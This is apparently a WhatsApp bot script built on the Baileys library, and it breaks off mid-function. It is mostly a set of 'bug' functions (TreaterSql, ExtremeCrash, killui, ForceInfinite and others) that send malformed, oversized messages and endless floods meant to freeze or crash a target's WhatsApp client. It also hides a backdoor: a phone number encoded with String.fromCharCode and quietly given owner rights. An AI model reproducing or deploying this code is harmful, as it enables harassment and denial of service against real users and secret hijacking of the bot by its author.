process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)


/* 

=========================================================================

 HELO BG 🦅
 CREDIT : 𝐴𝑙𝑤𝑎𝑦𝑠𝑍𝑎𝑘𝑧𝑧 𝑂𝑓𝑓𝑖𝑐𝑖𝑎𝑙
 WA AlwaysZakzz : 6285817068074
 
=========================================================================

*/


require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec } = require("child_process");
const { setSecurityLevel } = require('./library/CloudFlare')
const { createCanvas, loadImage } = require("canvas");
const { spawn, execSync } = require('child_process');
const checkDisk = require('check-disk-space');
const ip = require('ip');
const checkDiskSpace = require('check-disk-space').default;

const { default: makeWASocket,useMultiFileAuthState,fetchLatestBaileysVersion,generateWAMessageFromContent,generateWAMessageContent,downloadContentFromMessage,downloadMediaMessage,generateWAMessage,prepareWAMessageMedia,areJidsSameUser,getContentType,WA_DEFAULT_EPHEMERAL,proto} = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const cloudflare = require('./library/CloudFlare');
let setgbonly = JSON.parse(fs.readFileSync("./library/setgbonly.json", "utf8"));
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

module.exports = ZakzzDev = async (ZakzzDev, m, chatUpdate, store) => {
	try {
await LoadDataBase(ZakzzDev, m)
const botNumber = await ZakzzDev.decodeJid(ZakzzDev.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const func = {
  capital: (str) => {
    if (!str) return '';
    return str.charAt(0).toUpperCase() + str.slice(1);
  }
};

const CHANNELS_FILE = "./library/savesaluran.json";

// Fungsi untuk memuat data saluran dari file
function loadChannels() {
if (fs.existsSync(CHANNELS_FILE)) {
return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
}
return [];
}

function saveChannels(data) {
fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
}

global.channels = loadChannels();

global.mods = fs.existsSync("./library/database/mod.json") ? JSON.parse(fs.readFileSync("./library/database/mod.json")) : [];
global.cooldowns = global.cooldowns || {};
global.cooldownTimeJPM = 15 * 60 * 1000; // 15 menit = untuk mengatur delay cooldown khusus moderator 

function saveMods() {
    fs.writeFileSync("./library/database/mod.json", JSON.stringify(global.mods, null, 2));
}

global.autoJpmchInterval = null;
global.autoJpmchMessage = null;
global.autoJpmchMedia = null;

global.jpmProcessing = false;
//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}
//~~~~~~~~~~ Function ~~~~~~~~~//

async function TreaterSql(target) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  console.log(chalk.red(`AlwaysZakzz V9 Bug Send To Target ${target}`));

  try {
    for (let x = 0; x < 5; x++) {
      const echoMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { title: "", hasMediaAttachment: false },
              body: { text: "" },
              footer: {
                text: "AlwaysZakzz V9"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: [
                  { name: 'single_select', buttonParamsJson: '\u0000' + Poseidon },
                  { name: 'mpm', buttonParamsJson: '{}'.repeat(1000) + Poseidon },
                  { name: 'mpm', buttonParamsJson: '\u0003' + Poseidon },
                  { name: 'call_permission_request', buttonParamsJson: '{}' }
                ]
              },
              contextInfo: {
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 9000 }, () =>
                    "1" + Math.floor(Math.random() * 250208) + "@s.whatsapp.net"
                  )
                ]
              }
            }
          }
        }
      }), { userJid: target, timestamp: Math.floor(Date.now() / 1000) });

      echoMsg.messageTimestamp = Math.floor(Date.now() / 1000);
      await ZakzzDev.relayMessage(target, echoMsg.message, {
        participant: { jid: target },
        messageId: echoMsg.key.id
      });
      await sleep(3000);
      await ZakzzDev.sendMessage(target, { delete: echoMsg.key });
    }

    await ZakzzDev.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?...",
                mimetype: "application/json",
                fileSha256: "ZUQzs6adM+DC5ZI3MuHr3RbsAaj66LvmZ1R8+El5cqc=",
                fileLength: "401",
                mediaKey: "X6f0YZpo7xItqTXuawYmZJy6eLaXv9m/1nFZq2rW7p0=",
                fileName: "𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧".repeat(10),
                fileEncSha256: "6gmEaQ6o3q7TgsBLKLYlr8sJmbb+yYxpYLuQ1F4vbBs=",
                mediaKeyTimestamp: "1731681321"
              },
              hasMediaAttachment: true
            },
            body: { text: "ꦾ".repeat(32000) + "@1".repeat(32000) },
            contextInfo: {
              mentionedJid: ["120363403066612655@newsletter"]
            }
          }
        }
      }
    }, { participant: { jid: target } }, { messageId: null });

    await ZakzzDev.relayMessage(target, {
      videoMessage: {
        url: "https://example.com/fake.mp4",
        mimetype: "video/mp4",
        caption: "꧔꧈".repeat(15000),
        fileSha256: Buffer.from("00", "hex"),
        fileLength: 999999999,
        height: 9999,
        width: 9999,
        mediaKey: Buffer.from("00", "hex"),
        fileEncSha256: Buffer.from("00", "hex"),
        directPath: "/v/t62.7118-24/...",
        mediaKeyTimestamp: 999999999,
        jpegThumbnail: Buffer.from("00", "hex"),
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: "꧔꧈",
            body: "꧔꧈",
            thumbnail: Buffer.from("00", "hex"),
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true
          }
        }
      }
    }, { participant: { jid: target } });

    console.log("\x1b[32m[✔] TreaterSql Sukses Send");

    while (true) {
      const flowPayload = {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: 'AlwaysZakzz V9', format: 'OVERFLOW' },
              nativeFlowResponseMessage: {
                name: 'ai_entry_point',
                paramsJson: "{".repeat(9999),
                version: 3
              },
              nativeFlowMessage: {
                name: 'galaxy_message',
                paramsJson: "{".repeat(9999),
                version: 3
              }
            }
          }
        }
      };

      const carouselPayload = {
        viewOnceMessage: {
          message: {
            carouselMessage: {
              cards: Array.from({ length: 200 }, () => ({
                cardHeader: {
                  title: "\u0000".repeat(999),
                  subtitle: 'POSEIDON | CORE999',
                  thumbnail: Buffer.alloc(1024 * 32).fill(0)
                },
                cardContent: { title: '\u0000', description: '\n'.repeat(500) },
                buttons: [
                  { name: 'call_permission_request', buttonParamsJson: '\u0000' },
                  { name: 'mpm', buttonParamsJson: '{'.repeat(1000) },
                  { name: 'single_select', buttonParamsJson: '' }
                ]
              }))
            }
          }
        }
      };

      await ZakzzDev.relayMessage(target, flowPayload, {
        participant: { jid: target }
      });

      await ZakzzDev.relayMessage(target, carouselPayload, {
        participant: { jid: target }
      });

      await sleep(500);
    }

  } catch (err) {
    console.error("\x1b[31m[✖] AlwaysZakzz V9 Crash Send Failed:", err.message);
  }
}

async function TreatehSql(target) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  console.log(chalk.red(`AlwaysZakzz V9 Bug Send To Target ${target}`));

  try {
    for (let x = 0; x < 5; x++) {
      const echoMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { title: "", hasMediaAttachment: false },
              body: { text: "" },
              footer: {
                text: "AlwaysZakzz V9"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: [
                  { name: 'single_select', buttonParamsJson: '\u0000' + Poseidon },
                  { name: 'mpm', buttonParamsJson: '{}'.repeat(1000) + Poseidon },
                  { name: 'mpm', buttonParamsJson: '\u0003' + Poseidon },
                  { name: 'call_permission_request', buttonParamsJson: '{}' }
                ]
              },
              contextInfo: {
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 9000 }, () =>
                    "1" + Math.floor(Math.random() * 250208) + "@s.whatsapp.net"
                  )
                ]
              }
            }
          }
        }
      }), { userJid: target, timestamp: Math.floor(Date.now() / 1000) });

      echoMsg.messageTimestamp = Math.floor(Date.now() / 1000);
      await ZakzzDev.relayMessage(target, echoMsg.message, {
        participant: { jid: target },
        messageId: echoMsg.key.id
      });
      await sleep(3000);
      await ZakzzDev.sendMessage(target, { delete: echoMsg.key });
    }

    await ZakzzDev.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?...",
                mimetype: "application/json",
                fileSha256: "ZUQzs6adM+DC5ZI3MuHr3RbsAaj66LvmZ1R8+El5cqc=",
                fileLength: "401",
                mediaKey: "X6f0YZpo7xItqTXuawYmZJy6eLaXv9m/1nFZq2rW7p0=",
                fileName: "𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧".repeat(10),
                fileEncSha256: "6gmEaQ6o3q7TgsBLKLYlr8sJmbb+yYxpYLuQ1F4vbBs=",
                mediaKeyTimestamp: "1731681321"
              },
              hasMediaAttachment: true
            },
            body: { text: "ꦾ".repeat(32000) + "@1".repeat(32000) },
            contextInfo: {
              mentionedJid: ["120363403066612655@newsletter"]
            }
          }
        }
      }
    }, { participant: { jid: target } }, { messageId: null });

    await ZakzzDev.relayMessage(target, {
      videoMessage: {
        url: "https://example.com/fake.mp4",
        mimetype: "video/mp4",
        caption: "꧔꧈".repeat(15000),
        fileSha256: Buffer.from("00", "hex"),
        fileLength: 999999999,
        height: 9999,
        width: 9999,
        mediaKey: Buffer.from("00", "hex"),
        fileEncSha256: Buffer.from("00", "hex"),
        directPath: "/v/t62.7118-24/...",
        mediaKeyTimestamp: 999999999,
        jpegThumbnail: Buffer.from("00", "hex"),
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: "꧔꧈",
            body: "꧔꧈",
            thumbnail: Buffer.from("00", "hex"),
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true
          }
        }
      }
    }, { participant: { jid: target } });

    console.log("\x1b[32m[✔] AlwaysZakzz V9 Sukses Send");

    while (true) {
      const flowPayload = {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: 'AlwaysZakzz V9', format: 'OVERFLOW' },
              nativeFlowResponseMessage: {
                name: 'ai_entry_point',
                paramsJson: "{".repeat(9999),
                version: 3
              },
              nativeFlowMessage: {
                name: 'galaxy_message',
                paramsJson: "{".repeat(9999),
                version: 3
              }
            }
          }
        }
      };

      const carouselPayload = {
        viewOnceMessage: {
          message: {
            carouselMessage: {
              cards: Array.from({ length: 200 }, () => ({
                cardHeader: {
                  title: "\u0000".repeat(999),
                  subtitle: 'POSEIDON | CORE999',
                  thumbnail: Buffer.alloc(1024 * 32).fill(0)
                },
                cardContent: { title: '\u0000', description: '\n'.repeat(500) },
                buttons: [
                  { name: 'call_permission_request', buttonParamsJson: '\u0000' },
                  { name: 'mpm', buttonParamsJson: '{'.repeat(1000) },
                  { name: 'single_select', buttonParamsJson: '' }
                ]
              }))
            }
          }
        }
      };

      await ZakzzDev.relayMessage(target, flowPayload, {
        participant: { jid: target }
      });

      await ZakzzDev.relayMessage(target, carouselPayload, {
        participant: { jid: target }
      });

      await sleep(500);
    }

  } catch (err) {
    console.error("\x1b[31m[✖] AlwaysZakzz V9 Crash Send Failed:", err.message);
  }
}

async function ExtremeCrash(target) {
    try {
        let crashMessage = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(50000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: Infinity, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "AlwaysZakzz V9\n".repeat(35000),
                        },
                        nativeFlowMessage: {
                            buttons: Array(100).fill({ name: "mpm", buttonParamsJson: "" })
                        },
                    },
                },
            },
        };

        await ZakzzDev.relayMessage(target, crashMessage, {
            participant: { jid: target },
        });

        console.log("Crash message sent. WhatsApp should freeze or crash.");
    } catch (err) {
        console.log("Error sending crash message:", err);
    }
}

async function killui(target, Ptcp = true) {
console.log(chalk.red({target}));
      await ZakzzDev.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/k65fvb.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "AlwaysZakzz V9\n" + "ꦾ".repeat(35000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function ForceInfinite(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "AlwaysZakzz V9",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "AlwaysZakzz V9",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: "AlwaysZakzz V9",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(25000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await ZakzzDev.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function XProtexBlankChatV3(target) {
  const XProtex = '_*~@2~*_\n'.repeat(25000);
  const Private = 'ោ៝'.repeat(5000);
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363403066612655@newsletter",
      newsletterName: "AlwaysZakzz V9" + "ោ៝".repeat(25000),
      caption: "AlwaysZakzz V9" + Private + "ោ៝".repeat(25000),
      inviteExpiration: "999999999",
    },
  };

  await ZakzzDev.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  const messageCrash2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: ZakzzDev.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                },
              },
            body: {
              text: "AlwaysZakzz V9" + "ꦾ".repeat(35000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
              ],
            },
          },
        },
      },
    };
    await ZakzzDev.relayMessage(target, messageCrash2, {
      participant: { jid: target },
    });

    console.log(`Succes Sending Bug Crash By AlwaysZakzz V9 To ${target}`);
      }

async function ForceBetaNew(target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "ោ៝".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "AlwaysZakzz V9" + "ꦾ".repeat(25000),
      caption: "ោ៝ AlwaysZakzz V9ោ៝"+ "ꦾ".repeat(25000),
      body: {
        text:
          "AlwaysZakzz V9" +
          "ោ៝".repeat(25000) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(25000),
      },
    },
       contextInfo: {
         deviceLogoutNotification: {
         divice: "ANDROID",
          timestamp: Date.now()
        },
    },
    nativeFlowMessage: {
      messageParamsJson: "{".repeat(25000) + "[".repeat(25000), 
      buttons: [
        {
          name: "single_target",
          buttonParamJson: "ោ៝".repeat(25000),
        },
        {
          name: "review_and_pay",
          paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"Kayla\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Kaylaa\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}", 
        },
        {
          name: "join_group",
          buttonParamJson: "ꦽ".repeat(25000),
        },
      ],
      messageParamsJson: "{".repeat(25000) + "[".repeat(25000), 
    },
  };

  await ZakzzDev.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function IosNew(target) {
await ZakzzDev.relayMessage(target, {
					extendedTextMessage: {
						text: "AlwaysZakzz V9\n" + "ꦾ".repeat(25000),
						contextInfo: {
							mentionedJid: "628953008888@s.whatsapp.net", ...Array.from({ length: 15000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
							stanzaId: "1234567890ABCDEF",
                            participant: target,
                            conversionDelaySeconds: 45,
							forwardingScore: 99,
							isForwarded: true,
							quotedAd: {
							advertiserName: "AlwaysZakzz V9",
							caption: "\u0000",
							mediaType: "IMAGE",
							jpegThumbnail: null,
							},
							externalAdReply: {
								title: "AlwaysZakzz V9" + "ꦾ".repeat(25000),
								body: "AlwaysZakzz V9" + "✨".repeat(25000),
								mediaType: "IMAGE",
								renderLargerThumbnail: true,
								previewType: "IMAGE",
								thumbnail: null,
								sourceType: "message",
								sourceId: "762",
								sourceUrl: "t.me/Aliftzycrt",
								mediaUrl: "https://www.youtube.com/@AlwaysZakzz",
								containsAutoReply: true,
								showAdAttribution: true,
							},
							disappearingMode: {
								initiator: 'INITIATED_BY_ME'
								},
								placeholderKey: {
						remoteJid: "0@s.whatsapp.net",
						fromMe: false,
						id: "0"
					}}}}, {
					participant: {
						jid: target
					}});
		};

async function TagWa(target, Ptcp = true) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    
    const contextInfo = {
        mentionedJid, 
        stanzaId: "1234567890ABCDEF", 
        participant: "0@s.whatsapp.net",
        quotedMessage: { 
            callLogMesssage: { 
                isVideo: true, 
                callOutcome: "1", 
                durationSecs: "0", 
                callType: "REGULAR",
                participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] 
            } 
        },
        remoteJid: target, 
        forwardingScore: 9999999, 
        isForwarded: true,
        externalAdReply: { 
            title: "", 
            body: "", 
            mediaType: "VIDEO", 
            renderLargerThumbnail: true,
            thumbnail: `https://img1.pixhost.to/images/7898/631129927_alwayszakzz.jpg`,
            sourceUrl: "https://www.instagram.com/WhatsApp" 
        }
    };
    
    await ZakzzDev.relayMessage(target, { 
        extendedTextMessage: { 
            text: "AlwaysZakzz V9>" + "@0".repeat(32000), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: target } } : {});
}

// func bug group + Channel wa

async function VampireGroupInvis(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `120363403066612655@newsletter`,
                        newsletterName: "𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳 𝐕𝟖" + "ꦾ".repeat(5000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(5000) + "@9".repeat(5000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await ZakzzDev.sendMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function GroupCarous(target) {
let Yuukiy = {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "", 
liveLocationMessage: {
degreesLatitude: 0,
degreesLongitude: 0,
jpegThumbnail: thumb
}, 
hasMediaAttachment: true
}, 
body: {
